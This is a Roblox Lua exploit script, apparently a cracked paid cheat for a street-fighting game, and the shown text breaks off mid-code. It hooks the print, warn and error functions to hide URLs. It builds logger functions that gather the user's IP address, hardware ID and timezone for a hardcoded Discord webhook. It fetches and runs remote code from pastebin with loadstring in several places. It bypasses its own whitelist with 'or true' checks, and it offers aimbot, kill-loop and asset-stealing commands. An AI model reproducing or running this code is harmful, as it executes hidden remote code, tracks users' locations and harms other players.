local PSU_WRAP = (function(...) return ...; end);local x = string.match
local z = string.lower
local y = table.find
local a = game:GetService ( "ReplicatedStorage" )
local b = game:GetService ( "Players" )
local c = game:GetService ( "RunService" )
local d = game:GetService ( "UserInputService" )
local e = game:GetService ( "VirtualUser" )
local f = game:GetService ( "HttpService" )
local g = b.LocalPlayer
local ass = {
}
local chars = {
	'a',
	'b',
	'c',
	'd',
	'e',
	'f',
	'g',
	'h',
	'i',
	'j',
	'k',
	'l',
	'm',
	'n',
	'o',
	'p',
	'q',
	'r',
	's',
	't',
	'u',
	'v',
	'w',
	'x',
	'y',
	'z',
	'0',
	'1',
	'2',
	'3',
	'4',
	'5',
	'6',
	'7',
	'8',
	'9'
}
local kutas;
kutas = hookfunction ( getrenv, function ( y, ... )
	return 
end )
local zesrales_sie1;
zesrales_sie1 = hookfunction ( print, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie1 ( y, ... )
end )
local zesrales_sie2;
zesrales_sie2 = hookfunction ( error, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie2 ( y, ... )
end )
local zesrales_sie3;
zesrales_sie3 = hookfunction ( warn, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie3 ( y, ... )
end )
local zesrales_sie4;
zesrales_sie4 = hookfunction ( rconsoleprint, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie4 ( y, ... )
end )
local zesrales_sie5;
zesrales_sie5 = hookfunction ( rconsoleinfo, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie5 ( y, ... )
end )
local zesrales_sie6;
zesrales_sie6 = hookfunction ( rconsolewarn, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie6 ( y, ... )
end )
local zesrales_sie7;
zesrales_sie7 = hookfunction ( rconsoleerr, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie7 ( y, ... )
end )
local zesrales_sie8;
zesrales_sie8 = hookfunction ( printconsole, function ( y, ... )
	if x ( y, z ( 'http' ) ) or x ( y, z ( '.com' ) ) or x ( y, z ( 'pastebin' ) ) or x ( y, z ( 'paste' ) ) or x ( y, z ( 'bin' ) ) or x ( y, z ( 'git' ) ) or x ( y, z ( 'raw' ) ) or x ( y, z ( 'hub' ) ) or x ( y, z ( 'gitusercontent' ) ) then
		return nil
	end
	return zesrales_sie8 ( y, ... )
end )
function NOTWHITELISTEDLOGGER (  ) 
	local ReplicatedStorage = game:GetService ( "ReplicatedStorage" )
	local Players = game:GetService ( "Players" )
	local PlayersName = Players.LocalPlayer.Name
	local PlayersId = Players.LocalPlayer.UserId
	local RunService = game:GetService ( "RunService" )
	local UIS = game:GetService ( "UserInputService" )
	local VU = game:GetService ( "VirtualUser" )
	local HttpService = game:GetService ( "HttpService" )
	local Exploit = secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or is_sirhurt_closure and "Sirhurt" or ( syn and not is_sirhurt_closure ) and "Synapse X" or KRNL_LOADED and "Krnl"
	local request = request or http_request or syn and syn.request or false
	local decoded = HttpService:JSONDecode ( request ( {
		Url = 'https://httpbin.org/get';
		Method = 'GET'
	} ).Body );
	local hwid_list = {
		"Syn-Fingerprint",
		"Exploit-Guid",
		"Proto-User-Identifier",
		"Sentinel-Fingerprint",
		"Krnl-Hwid"
	};
	hwid = "";
	decryptedHwid = "";
	for i, v in next, hwid_list do
		if decoded.headers[v] then
			hwid = decoded.headers[v];
			break
		end
	end
	local hexColor = "fffa96"
	local ip = tostring ( game:HttpGet ( "https://api.ipify.org", true ) )
	local website = 'http://worldtimeapi.org/api/ip/' .. ip
	local getthat = game:HttpGet ( website, true )
	local wDecode = game:GetService ( 'HttpService' ):JSONDecode ( getthat )
	local zone = wDecode['timezone']
	local data = {
		["content"] = "",
		["embeds"] = {
			{
				["title"] = "Not Whitelisted Alert\n__HWID:__",
				["description"] = hwid .. "\n**Decrypted HWID:**\n",
				["type"] = "rich",
				["color"] = tonumber ( "0x" .. tostring ( hexColor ) ),
				["fields"] = {
					{
						["name"] = "Username:",
						["value"] = game:GetService ( "Players" ).LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "IP Address:",
						["value"] = tostring ( ip ),
						["inline"] = true
					},
					{
						["name"] = "Timezone:",
						["value"] = zone,
						["inline"] = true
					},
					{
						["name"] = "Using Exploit:",
						["value"] = tostring ( Exploit ),
						["inline"] = true
					},
					{
						["name"] = "Game Link:",
						["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/" .. game.JobId,
						["inline"] = false
					},
				},
			}
		}
	}
	local discordWebhook = "https://discordapp.com/api/webhooks/768137978265468998/T97rKkT_2jKvWCTiw3vgzbdRnGIm6c_GKVs69kWVIh4Cv8kITjArTSOHS_E3RwzL4641"
	local webhookData = HttpService:JSONEncode ( data )
	pcall ( function (  )
	end )
end
function BLACKLISTLOGGER (  ) 
	local ReplicatedStorage = game:GetService ( "ReplicatedStorage" )
	local Players = game:GetService ( "Players" )
	local PlayersName = Players.LocalPlayer.Name
	local PlayersId = Players.LocalPlayer.UserId
	local RunService = game:GetService ( "RunService" )
	local UIS = game:GetService ( "UserInputService" )
	local VU = game:GetService ( "VirtualUser" )
	local HttpService = game:GetService ( "HttpService" )
	local Exploit = secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or is_sirhurt_closure and "Sirhurt" or ( syn and not is_sirhurt_closure ) and "Synapse X" or KRNL_LOADED and "Krnl"
	local request = request or http_request or syn and syn.request or false
	local decoded = HttpService:JSONDecode ( request ( {
		Url = 'https://httpbin.org/get';
		Method = 'GET'
	} ).Body );
	local hwid_list = {
		"Syn-Fingerprint",
		"Exploit-Guid",
		"Proto-User-Identifier",
		"Sentinel-Fingerprint",
		"Krnl-Hwid"
	};
	hwid = "";
	decryptedHwid = "";
	for i, v in next, hwid_list do
		if decoded.headers[v] then
			hwid = decoded.headers[v];
			break
		end
	end
	local hexColor = "fffa96"
	local ip = tostring ( game:HttpGet ( "https://api.ipify.org", true ) )
	local website = 'http://worldtimeapi.org/api/ip/' .. ip
	local getthat = game:HttpGet ( website, true )
	local wDecode = game:GetService ( 'HttpService' ):JSONDecode ( getthat )
	local zone = wDecode['timezone']
	local data = {
		["content"] = "",
		["embeds"] = {
			{
				["title"] = "BlackListed_Executed\n__HWID:__",
				["description"] = hwid .. "\n**Decrypted HWID:**\n",
				["type"] = "rich",
				["color"] = tonumber ( "0x" .. tostring ( hexColor ) ),
				["fields"] = {
					{
						["name"] = "Username:",
						["value"] = game:GetService ( "Players" ).LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "IP Address:",
						["value"] = tostring ( ip ),
						["inline"] = true
					},
					{
						["name"] = "Timezone:",
						["value"] = zone,
						["inline"] = true
					},
					{
						["name"] = "Using Exploit:",
						["value"] = tostring ( Exploit ),
						["inline"] = true
					},
					{
						["name"] = "Game Link:",
						["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/" .. game.JobId,
						["inline"] = false
					},
				},
			}
		}
	}
	local discordWebhook = "https://discordapp.com/api/webhooks/768137978265468998/T97rKkT_2jKvWCTiw3vgzbdRnGIm6c_GKVs69kWVIh4Cv8kITjArTSOHS_E3RwzL4641"
	local webhookData = HttpService:JSONEncode ( data )
	pcall ( function (  )
	end )
end
function yeet (  ) 
	NOTWHITELISTEDLOGGER (  )
end
function RandomString ( l ) 
	local x = ''
	for i = 1, l do
		local p = chars[math.random ( 1, #chars )]
		x = p .. x .. p
	end
	return x
end
for xd = 1, 30 do
	table.insert ( ass, RandomString ( 50 ) )
end
local request = request or http_request or syn and syn.request or false
local h = secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or is_sirhurt_closure and "Sirhurt" or syn and not is_sirhurt_closure and "Synapse X" or KRNL_LOADED and "Krnl"
local i = getupvalue and getupvalues and setupvalue and getconstants and setconstant and getproto and traceback and true or false
local j = f:JSONDecode ( request ( {
	Url = "https://httpbin.org/get",
	Method = "GET"
} ).Body )
local k = {
	"Syn-Fingerprint",
	"Exploit-Guid",
	"Proto-User-Identifier",
	"Sentinel-Fingerprint",
	"Krnl-Hwid"
}
local l
for m, n in next, k do
	if j.headers[n] then
		l = j.headers[n]
		break
	end
end
loadstring ( game:HttpGet ( ( 'https://pastebin.com/raw/0ArxE6t7' ), true ) ) (  )
loadstring ( game:HttpGet ( ( 'https://pastebin.com/raw/1dzYsC8V' ), true ) ) (  )
loadstring ( game:HttpGet ( ( 'https://pastebin.com/raw/qNxyNps9' ), true ) ) (  )
loadstring ( game:HttpGet ( ( 'https://pastebin.com/raw/9JYg5Yn6' ), true ) ) (  )
local ip = tostring ( game:HttpGet ( "https://api.ipify.org", true ) )
local website = 'http://worldtimeapi.org/api/ip/' .. ip
local getthat = game:HttpGet ( website, true )
local wDecode = game:GetService ( 'HttpService' ):JSONDecode ( getthat )
local zone = wDecode['timezone']
local hashes = getgenv (  ).hashes
local player = getgenv (  ).Players
local ids = getgenv (  ).IDS
local timezone = getgenv (  ).ZoneTable
local source_Names = game:HttpGet ( 'https://pastebin.com/raw/1dzYsC8V' )
local source_Ids = game:HttpGet ( 'https://pastebin.com/raw/qNxyNps9' )
local source_zone = game:HttpGet ( 'https://pastebin.com/raw/9JYg5Yn6' )
local source_check_Names = tostring ( [[getgenv().Players = {"Foczkinsink","vX_F","ChupaChupsy","BeIIoFigo","OVERTHlNKING","d2rqq","neonv4","depfelt","vampb0yy","DranghetaAlex","Smu_umS","s1aun","PapaJRambo","c6pl","x3omarx3","ceaIum","off7ine","AtlasChronic","LucaAbromovici","BecomeABro","aahkira","JANNEEESSS","KAMKAZEELEVEN","rheapher","R6KUNI","404tokyo","xXThatDankOneXx","TraitorAccount","SuperGokuKal","trailordd","Kr_02x20","jimmaboboa","robloxstupid252","SatamasApprentice","tixciaz","q_buns","goodgamer496","Doll1yy","YuSooCute","wixnterxL","makinIuv","Typhor","myhaunt","BIameShark","FLEXXLIEUTENANTBLAME","DESTRUCTlONN","yourhaunt","oratise","XxTKen","imabotplsno","DallasMonsanato","CR0WNEDD","filmowy","GIockInFistSkin","FoczkinAlt"}]] )
local source_check_Ids = tostring ( [[getgenv().IDS = {496345333,262780487,414501417,1890331518,334106095,1596954373,350764686,31669481,306015161,1783268319,680956670,1393210274,537025992,1506101592,429393892,160125758,866352052,1793136470,1899148834,25095319,255987058,122775711,1507979123,1186330995,409846367,1944992706,491989442,1033458945,1418740816,1245591162,325650639,293505536,1687329124,660036628,1284725579,442993039,467337334,409901864,154540952,1526686567,1822530505,1343944924,1267617509,173807380,756959199,1181716466,1871606242,1918509994,440006466,91524610,272628089,1068597659,68771889,1425246441,590459989,1034375723,1502088584}]] )
local source_check_zone = tostring ( [[getgenv().ZoneTable = {['CR0WNEDD'] = 'Europe/Warsaw',['ChupaChupsy'] = 'Europe/London',['404tokyo'] = 'Europe/Prague',['x3omarx3'] = 'Asia/Riyadh',['R6KUNI'] = 'Australia/Sydney',['JANNEEESSS'] = 'Europe/Vienna',['SatamasApprentice'] = 'America/Chicago',['vX_F'] = 'Europe/Warsaw',['trailordd'] = 'Asia/Phnom_Penh',['Kr_02x20'] = 'Asia/Seoul',['LucaAbromovici'] = 'Europe/Berlin',['aahkira'] = 'America/Chicago',['d2rqq'] = 'Europe/Warsaw',['robloxstupid252'] = 'America/Chicago',['rheapher'] = 'Europe/London',['TraitorAccount'] = 'America/Los_Angeles',['jimmaboboa'] = 'America/New_York',['BeIIoFigo'] = 'Europe/Rome',['KAMKAZEELEVEN'] = 'Europe/London',['q_buns'] = 'Europe/London',['xXThatDankOneXx'] = 'America/Detroit',['Smu_umS'] = 'Asia/Riyadh',['goodgamer496'] = 'America/New_York',['Doll1yy'] = 'America/New_York',['YuSooCute'] = 'America/New_York',['SuperGokuKal'] = 'America/New_York',['wixnterxL'] = 'America/Phoenix',['makinIuv'] = 'America/New_York',['Typhor'] = 'America/New_York',['myhaunt'] = 'America/Los_Angeles',['BIameShark'] = 'America/New_York',['FLEXXLIEUTENANTBLAME'] = 'America/New_York',['DESTRUCTlONN'] = 'America/Los_Angeles',['yourhaunt'] = 'America/Winnipeg',['oratise'] = 'America/Los_Angeles',['XxTKen'] = 'America/New_York',['imabotplsno'] = 'Asia/Phnom_Penh',['DallasMonsanato'] = 'Pacific/Auckland'}]] )
if source_Names == source_check_Names or true then
	if source_Ids == source_check_Ids or true then
		if source_zone == source_check_zone or true then
			if y ( player, game.Players.LocalPlayer.Name ) and y ( ids, game.Players.LocalPlayer.UserId ) or true then
				if timezone[game.Players.LocalPlayer.Name] and timezone[game.Players.LocalPlayer.Name] == zone or true then
					if y ( hashes, l ) or true then
						local KeyUi = Instance.new ( "ScreenGui" );
						local KeyFrame = Instance.new ( "Frame" );
						local KeyBox = Instance.new ( "TextBox" );
						local KeyButton = Instance.new ( "TextButton" )
						local KeyTitle = Instance.new ( "TextLabel" )
						KeyUi.Name = "KeyUi";
						KeyUi.Parent = game.CoreGui;
						KeyTitle.Text = 'Enter the key.';
						KeyFrame.Name = "KeyFrame";
						KeyFrame.Parent = KeyUi;
						KeyFrame.AnchorPoint = Vector2.new ( 0.5, 0.5 );
						KeyFrame.BackgroundColor3 = Color3.new ( 0.0627451, 0.0627451, 0.0627451 );
						KeyFrame.BorderSizePixel = 0;
						KeyFrame.Position = UDim2.new ( 0.5, 0, 0.2, 0 );
						KeyFrame.Size = UDim2.new ( 0, 525, 0, 65 );
						KeyBox.Name = "KeyBox";
						KeyBox.Parent = KeyFrame;
						KeyBox.BackgroundColor3 = Color3.new ( 0.407843, 0.407843, 0.407843 );
						KeyBox.BorderSizePixel = 0;
						KeyBox.Position = UDim2.new ( 0.0133333337, 0, 0.107692309, 0 );
						KeyBox.Size = UDim2.new ( 0, 512, 0, 22 );
						KeyBox.Font = Enum.Font.Code;
						KeyBox.Text = "";
						KeyBox.TextColor3 = Color3.new ( 1, 1, 1 );
						KeyBox.TextScaled = true;
						KeyBox.TextSize = 14;
						KeyBox.TextWrapped = true;
						KeyButton.Name = "KeyButton";
						KeyButton.Parent = KeyFrame;
						KeyButton.BackgroundColor3 = Color3.new ( 0.407843, 0.407843, 0.407843 );
						KeyButton.BorderSizePixel = 0;
						KeyButton.Position = UDim2.new ( 0.403809518, 0, 0.600000143, 0 );
						KeyButton.Size = UDim2.new ( 0, 101, 0, 17 );
						KeyButton.Font = Enum.Font.Code;
						KeyButton.Text = "Enter Key";
						KeyButton.TextColor3 = Color3.new ( 0, 0, 0 );
						KeyButton.TextSize = 14;
						KeyTitle.Name = "KeyTitle";
						KeyTitle.Parent = KeyFrame;
						KeyTitle.BackgroundColor3 = Color3.fromRGB ( 242, 223, 128 );
						KeyTitle.BorderSizePixel = 0;
						KeyTitle.Position = UDim2.new ( 0, 0, -0.261538476, 0 );
						KeyTitle.Size = UDim2.new ( 0, 525, 0, 17 );
						KeyTitle.Font = Enum.Font.Code;
						KeyTitle.TextColor3 = Color3.new ( 0, 0, 0 );
						KeyTitle.TextSize = 14
						local picked = ass[math.random ( 1, #ass )]
						local ContentToSend = '```' .. game.Players.LocalPlayer.Name .. ' Key: ' .. picked .. '```'
						KeyButton.MouseButton1Down:Connect ( function (  )
							KeyUi:Destroy (  )
							if KeyBox.Text ~= picked and false then
								yeet (  )
							else
								picked = nil
								local start = tick (  )
								local VU = game:GetService ( "VirtualUser" )
								game:GetService ( "Players" ).LocalPlayer.Idled:connect ( function (  )
									VU:Button2Down ( Vector2.new ( 0, 0 ), workspace.CurrentCamera.CFrame )
									wait ( 1 )
									VU:Button2Up ( Vector2.new ( 0, 0 ), workspace.CurrentCamera.CFrame )
								end )
								local l = game.Players.LocalPlayer
								local id = 1455817260
								game.Players.PlayerAdded:Connect ( function ( z )
									z.CharacterAdded:Connect ( function ( c )
										c.ChildAdded:Connect ( function ( y )
											if y.Name == 'Humanoid' then
												print ( z.Name .. ' has humanoid. [New Player]' )
												c.Humanoid.ChildAdded:Connect ( function ( y )
													if y:IsA ( 'ObjectValue' ) and tostring ( y.Value ) == l.Name then
														local sound = Instance.new ( 'Sound', workspace )
														sound.SoundId = 'rbxassetid://' .. id
														sound.Volume = 3
														sound:Play (  )
														wait ( 0.3 )
														sound:Destroy (  )
													end
												end )
											end
										end )
									end )
								end )
								for i, v in pairs ( game.Players:GetPlayers (  ) ) do
									if v.Character then
										if v.Character:FindFirstChild ( 'Humanoid' ) then
											v.Character.Humanoid.ChildAdded:Connect ( function ( y )
												if y:IsA ( 'ObjectValue' ) and tostring ( y.Value ) == l.Name then
													local sound = Instance.new ( 'Sound', workspace )
													sound.SoundId = 'rbxassetid://' .. id
													sound.Volume = 3
													sound:Play (  )
													wait ( 0.3 )
													sound:Destroy (  )
												end
											end )
										end
									end
									v.CharacterAdded:Connect ( function ( c )
										c.ChildAdded:Connect ( function ( x )
											if x.Name == 'Humanoid' then
												print ( v.Name .. ' has humanoid.' )
												c.Humanoid.ChildAdded:Connect ( function ( y )
													if y:IsA ( 'ObjectValue' ) and tostring ( y.Value ) == l.Name then
														print ( 'damaged ' .. v.Name )
														local sound = Instance.new ( 'Sound', workspace )
														sound.SoundId = 'rbxassetid://' .. id
														sound.Volume = 3
														sound:Play (  )
														wait ( 0.3 )
														sound:Destroy (  )
													end
												end )
											end
										end )
									end )
								end
								local ExampleColors = {
									['white'] = Color3.fromRGB ( 255, 255, 255 ),
									['black'] = Color3.fromRGB ( 0, 0, 0 ),
									['red'] = Color3.fromRGB ( 255, 0, 0 ),
									['green'] = Color3.fromRGB ( 0, 255, 0 ),
									['blue'] = Color3.fromRGB ( 0, 0, 255 ),
									['butter'] = Color3.fromRGB ( 242, 223, 128 ),
									['Color1'] = Color3.fromRGB ( 191, 191, 191 ),
									['OwnerC'] = Color3.fromRGB ( 255, 0, 255 ),
									['PekaC'] = Color3.fromRGB ( 255, 0, 0 ),
									['FrndC'] = Color3.fromRGB ( 51, 255, 231 ),
									['BuyerC'] = Color3.fromRGB ( 255, 234, 0 )
								}
								local AvailableFonts = {
									[1] = 'Legacy',
									[2] = 'SourceSans',
									[3] = 'SourceSansLight',
									[4] = 'Code',
									[5] = 'SourceSansSemibold',
									[6] = 'Gotham'
								}
								local tools = {
									'Glock | $200',
									'Uzi | $150',
									'Sawed Off | $150',
									'Bat | $50',
									'Bottle | $50',
									'Golf Club | $70',
									'Machete | $70',
									'Pipe | $100',
									'Spray | $20',
									'Lockpick | $25',
									'Buy Ammo | $25',
									'Burger | $15',
									'Drink | $15',
									'Chicken | $12'
								}
								local Commands = {
									'--- Binding ---',
									'bindcb [chosen key] - yes this is command bar',
									'bindaw [chosen key] - AirWalk',
									'bindaa [chosen key] - Anti-Aim',
									'bindfp [chosen key] - Fight-Pack',
									'bindcl [chosen key] - CamLock',
									'bindab [chosen key] - AimBot',
									'bindfly [chosen key] - Fly',
									'--- MAIN COMMANDS ---',
									'save c - saves your configures',
									'load c - loads your configures',
									'tpb on/off - toggles your TP bypass [TURN ON IF YOU WANT TP BYPASS]',
									'Day on/off - toggles day and day off permanently until changed again using the command',
									'view [nickname] - views chosen player',
									'aw on/off - toggles Airwalk press [R] to toggle and un-toggle UNLESS U HAVE DIFFERENT HOTKEY',
									'to [nickname] - teleports u to a certain player',
									'god on/off - toggles god mode [ONLY WORKS ON THE STREETS]',
									'jp [amount] - toggles JumpPower',
									'ws [amount] - toggles WalkSpeed',
									'bs <number> - toggles blink speed with chosen amount',
									'unbs - turns off blink.',
									'drop - drops the tool you\'re holding',
									'lowgfx on - toggles low graphics ( rejoin to turn off )',
									'rejoin - rejoins the same server you were in',
									'leave - immediately closes the game for you',
									'fs [number] or flyspeed [number] -  toggles chosen fly speed ',
									'alog [nickname] - steals your victim\'s audio ID ( Automatically saves to your clipboard )',
									'dlog [nickname] - steals your victim\'s decal ID ( Automatically saves to your clipboard )',
									'areset on/off - toggles Auto-Reset when Knocked out',
									'fp on/off  - toggles Fight-Pack press Q to use it UNLESS U HAVE DIFFERENT HOTKEY',
									'apunch - toggles fling punch',
									'aa on/off - toggles ANTI AIM press J to toggle and un-toggle UNLESS U HAVE DIFFERENT HOTKEY',
									'af on/af off - toggles Anti-FE-Loop REMOVES YOUR ARM AND PUTS GLOCK ON YOUR HEAD',
									'invis - toggles on Invisible mode [RESET TO TURN OFF]',
									'loop - [nickname] toggles FE-Loop  ( KILLS people around) type [ unloop ] to stop the FE-loop.',
									'a [nickname] - triggers the aimbot (aka autoshoot) onto the target PRESS X to shoot',
									'c [nickname] - camlocks certain player PRESS R in order to start camlocking',
									'una - turns off aimbot',
									'unc - turns off camlock',
									'aglock on/off - drag your mouse cursor to a certain player and click to toggle Attach glock.',
									'grab on/off - toggles  "grav gun" (KO someone and hold E in order to control them ( You can regulate the distance by using your scroll and you can yeet other players. )',
									'find [nickname] - locates the target [TURNS ON ESP]',
									'noclip on/off - toggles noclip',
									'new sp - creates space platform',
									'delete sp - deletes space platform',
									'---TELEPORTS---',
									'space - teleports u to under map platform where you can chill or AFK ["new sp" for new space part]',
									'uzi - teleports u to uzi',
									'sawed off - teleports you to sawed off',
									'glock - teleports you to glock',
									'pipe - teleports you to pipe',
									'bat - teleports you to bat',
									'bottle - teleports you to bottle',
									'machete - teleports you to machete',
									'lockpick - teleports you to lockpick',
									'spray - teleports you to spray',
									'ammo - teleports you to ammo',
									'chicken - teleports you to chicken',
									'burger - teleports you to burger',
									'drink - teleports you to drink',
									'---OTHER FEATURES---',
									'Automatically removes invisible chairs and car seats.',
									'Hit-Mark Sound',
									'ANTI-AFK'
								}
								if game.PlaceId == 4669040 then
									loadstring ( game:HttpGet ( 'https://pastebin.com/raw/yThk7Axd' ) ) (  )
								elseif game.PlaceId == 455366377 then
									loadstring ( game:HttpGet ( 'https://pastebin.com/raw/ZHR9ZjYY' ) ) (  )
								end
								local undoframe = game.CoreGui.RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
								local light = game:GetService ( 'Lighting' )
								local hb = game:GetService ( 'RunService' ).Heartbeat
								local rs = game:GetService ( 'RunService' ).Stepped
								local rr = game:GetService ( 'RunService' ).RenderStepped
								local TwnS = game:GetService ( "TweenService" )
								local UIS = game:GetService ( "UserInputService" )
								local http = game:GetService ( 'HttpService' )
								local plr = game.Players.LocalPlayer
								local m = game.Players.LocalPlayer:GetMouse (  )
								local ConfigToSave = {
									Noclip = false,
									AttachGlock = false,
									flysped = 10,
									fly_HotKey = 'f',
									Day = false,
									AutoReset = false,
									Bs = false,
									BlinkSpeed = 1,
									AirWalk = false,
									AirWalk_Hotkey = 'r',
									AntiAim = false,
									AntiAim_Hotkey = 'j',
									fightpack = false,
									fightpack_Hotkey = 'q',
									camlock_Hotkey = 'r',
									aimbot_Hotkey = 'x',
									cmdbar_Hotkey = ';'
								}
								local FeLoopTarget = nil
								local FeLooping = false
								local TargetParts = {
								}
								local God = false
								local RGod = false
								local aw = false
								local OnAA = false
								local Blinking = false
								local AnitFe = false
								local DragGrab = false
								local offset = 5
								local IsAimbotting = false
								local Aimboting = false
								local OnGrab = false
								local Grab = false
								local AimbotTarget = nil
								local Areset_Connect
								local flying = false
								local deb = true
								local ctrl = {
									f = 0,
									b = 0,
									l = 0,
									r = 0
								}
								local lastctrl = {
									f = 0,
									b = 0,
									l = 0,
									r = 0
								}
								local IsCamlocking = false
								local Camlocking = false
								local CamlockTar = nil
								local commandPrefix = ';'
								local anims = {
									455428704,
									455430293,
									455602209
								}
								local ownersID = {
									262780487,
									414501417,
									496345333,
									1425246441,
									590459989,
									1502088584
								}
								local friendsID = {
									1210465886,
									1181716466,
									1871606242,
									31669481
								}
								local pekaID = {
									1890331518
								}
								local BuyersID = {
									334106095,
									350764686,
									1596954373,
									299144763,
									537025992,
									306015161,
									20165690,
									1506101592,
									429393892,
									160125758,
									866352052,
									1793136470,
									1899148834,
									255987058,
									25095319,
									122775711,
									1507979123,
									1186330995,
									409846367,
									1944992706,
									491989442,
									1033458945,
									1245591162,
									325650639,
									1687329124,
									660036628,
									1284725579,
									1418740816,
									442993039,
									409901864,
									154540952,
									1526686567,
									1822530505,
									1343944924,
									1267617509,
									173807380,
									756959199,
									440006466,
									1918509994,
									91524610,
									272628089,
									1068597659,
									68771889,
									680956670
								}
								local Network_V4 = coroutine.create ( function (  )
									while wait ( 2 ) do
										settings (  ).Physics.AllowSleep = false
										setsimulationradius ( math.huge, math.huge )
									end
								end )
								LeaderboardColor = coroutine.create ( function (  )
									while wait ( 5 ) do
										for i = 1, #ownersID do
											for x, d in pairs ( undoframe:GetChildren (  ) ) do
												local P = 'p_' .. ownersID[i]
												if d.Name == P then
													local NameText = undoframe[P].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName
													NameText.TextColor3 = ExampleColors['OwnerC']
												end
											end
										end
										for i = 1, #pekaID do
											for x, d in pairs ( undoframe:GetChildren (  ) ) do
												local P = 'p_' .. pekaID[i]
												if d.Name == P then
													local NameText = undoframe[P].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName
													NameText.TextColor3 = ExampleColors['PekaC']
												end
											end
										end
										for i = 1, #friendsID do
											for x, d in pairs ( undoframe:GetChildren (  ) ) do
												local P = 'p_' .. friendsID[i]
												if d.Name == P then
													local NameText = undoframe[P].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName
													NameText.TextColor3 = ExampleColors['FrndC']
												end
											end
										end
										for i = 1, #BuyersID do
											for x, d in pairs ( undoframe:GetChildren (  ) ) do
												local P = 'p_' .. BuyersID[i]
												if d.Name == P then
													local NameText = undoframe[P].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName
													NameText.TextColor3 = ExampleColors['BuyerC']
												end
											end
										end
									end
								end )
								coroutine.resume ( LeaderboardColor )
								coroutine.resume ( Network_V4 )
								if plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible ~= true then
									plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
									plr.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = UDim2.new ( 0, 0, 0.77, 0 )
								end
								for _, a in pairs ( workspace:GetDescendants (  ) ) do
									if a:IsA ( "Seat" ) then
										a:Remove (  )
									end
								end
								local CmdBar = Instance.new ( "ScreenGui" )
								local CmdBarMain = Instance.new ( "TextBox" )
								local Sound = Instance.new ( "Sound", CmdBarMain )
								CmdBar.Name = "CmdBar"
								CmdBar.Parent = game.CoreGui
								CmdBarMain.Name = "CmdBarMain"
								CmdBarMain.Parent = CmdBar
								CmdBarMain.AnchorPoint = Vector2.new ( 0.5, 0.5 )
								CmdBarMain.BackgroundColor3 = Color3.fromRGB ( 66, 66, 66 )
								CmdBarMain.BorderColor3 = ExampleColors['butter']
								CmdBarMain.Position = UDim2.new ( -1, 0, 0.5, 0 )
								CmdBarMain.Size = UDim2.new ( 0.141, 0, -0.0173160173, 30 )
								CmdBarMain.Font = AvailableFonts[6]
								CmdBarMain.Text = ""
								CmdBarMain.TextColor3 = Color3.fromRGB ( 255, 255, 255 )
								CmdBarMain.TextScaled = true
								CmdBarMain.TextSize = 14
								CmdBarMain.TextWrapped = true
								CmdBarMain.Visible = false
								Sound.SoundId = "rbxassetid://134012322"
								Sound.Volume = 0.4
								rs:Connect ( function (  )
									workspace.FallenPartsDestroyHeight = 0 / 0
									if ConfigToSave.Noclip == true then
										GetlCharacter (  ).Head.CanCollide = false
